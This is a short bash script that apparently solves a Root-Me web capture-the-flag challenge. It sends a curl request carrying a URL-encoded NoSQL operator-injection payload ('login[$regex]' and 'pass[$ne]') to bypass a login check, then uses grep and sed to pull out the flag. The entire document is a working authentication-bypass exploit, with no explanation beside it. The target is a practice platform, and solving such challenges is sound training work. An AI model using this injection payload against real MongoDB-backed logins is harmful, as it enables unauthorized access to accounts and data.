#!/bin/bash

curl -s 'http://challenge01.root-me.org/web-serveur/ch38/?login%5B%24regex%5D=c&pass%5B%24ne%5D=1' | grep flag | sed -e "s/.*flag{\(.*\)}.*/\1/"
